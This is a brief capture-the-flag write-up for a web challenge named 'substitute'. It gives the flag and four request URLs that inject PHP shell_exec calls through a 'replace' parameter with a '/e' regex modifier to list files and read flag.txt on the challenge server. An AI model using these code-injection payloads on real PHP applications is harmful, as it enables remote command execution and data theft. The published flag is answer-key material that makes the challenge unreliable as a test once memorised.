## substitute

**Flag: CTF{92b435bcd2f70aa18c38cee7749583d0adf178b2507222cf1c49ec95bd39054c}**

Get the existing files (`here_we_dont_have_flag index.php`):
```
http://35.198.90.23:30447/?replace=shell_exec("ls")&vector=/Admin/e
```
Get the file type of `here_we_dont_have_flag` (`directory`):
```
http://35.198.90.23:30447/?replace=shell_exec("file here_we_dont_have_flag")&vector=/Admin/e
```
Get the files from `here_we_dont_have_flag` (`flag.txt`):
```
http://35.198.90.23:30447/?replace=shell_exec("ls here_we_dont_have_flag/")&vector=/Admin/e
```
Get the flag:
```
http://35.198.90.23:30447/?replace=shell_exec("cat here_we_dont_have_flag/flag.txt")&vector=/Admin/e
```

[Back](../unbreakable.md)
